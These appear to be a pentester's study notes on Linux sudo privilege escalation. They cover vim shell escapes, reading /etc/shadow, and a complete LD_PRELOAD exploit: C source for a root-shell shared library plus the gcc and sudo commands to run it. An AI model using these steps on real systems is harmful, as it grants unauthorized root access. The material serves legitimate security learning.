
###### 4 major techniques
```
1. If any command alowed with sudo permission we can use his "Intended functionality"
2. If any command has sudo permission when we can do SHELL ESCAPING
3. If any "ENV VARIABLE" allowed with sudo poermissions then we can escalate privilege
4. 
```


###### `Intended functionality` means, what it’s **supposed to do** under normal conditions
Ex: `vim` for file edit, read and write so we can read `/etc/passwd` or `/etc/shadow`


###### `SHELL ESCAPING` some command has some functionality by which we can take SHELL Access
Ex: `vim -c ':!/bin/sh'`  
also can use `gtfobins`



When and command run with it he also run some supporting files called `Library files` windows has `.dll` files and Linux has `.so` files


###### List all commands which your user can execute with SUDO permission 
```
sudo -l
```


###### List all the Libraries using by the command 
```
ldd /usr/bin/vim
```
Output:
```
linux-vdso.so.1 (0x00007f497de2a000)
        libm.so.6 => /lib/x86_64-linux-gnu/libm.so.6 (0x00007f497d910000)
        libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007f497ddd6000)
        libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f497d8dc000)
        libsodium.so.23 => /lib/x86_64-linux-gnu/libsodium.so.23 (0x00007f497d880000)
        libacl.so.1 => /lib/x86_64-linux-gnu/libacl.so.1 (0x00007f497ddcb000)
        libgpm.so.2 => /lib/x86_64-linux-gnu/libgpm.so.2 (0x00007f497d875000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f497d67f000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f497de2c000)
        libpcre2-8.so.0 => /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007f497d5d0000)
```





##### LD_PRELOAD Exploitation 
###### Command for find LD_PRELOAD
```
sudo -l
```

###### Exploitation step:
```
1. Open a text editor and type:

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

  

2. Save the file as exploit.c

3. In command prompt type:
	gcc -fPIC -shared -o /tmp/exploit.so exploit.c -nostartfiles

4. In command prompt type:
	sudo LD_PRELOAD=/tmp/exploit.so apache2

5. In command prompt type: id
```

